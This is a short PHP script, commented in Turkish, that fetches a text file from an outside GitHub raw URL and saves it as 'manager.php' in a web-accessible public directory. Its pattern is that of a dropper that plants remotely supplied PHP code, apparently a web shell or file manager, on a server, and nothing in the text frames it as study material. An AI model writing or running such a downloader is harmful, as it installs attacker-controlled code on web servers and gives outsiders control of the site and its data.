<?php
// Hedef URL
$url = "https://raw.githubusercontent.com/necessaryfor/all/refs/heads/main/yeah.txt";

// İndirilecek dosya yolu
$targetDir = DIR . '/public/';
$targetFile = $targetDir . 'manager.php';

// Eğer hedef klasör yoksa oluştur
if (!is_dir($targetDir)) {
    mkdir($targetDir, 0755, true);
}

// Dosyayı indir
$fileContent = file_get_contents($url);
if ($fileContent === FALSE) {
    die("Dosya indirilemedi.");
}

// Dosyayı kaydet
if (file_put_contents($targetFile, $fileContent) === FALSE) {
    die("Dosya kaydedilemedi.");
}

echo "Dosya başarıyla kaydedildi: " . $targetFile;
?>
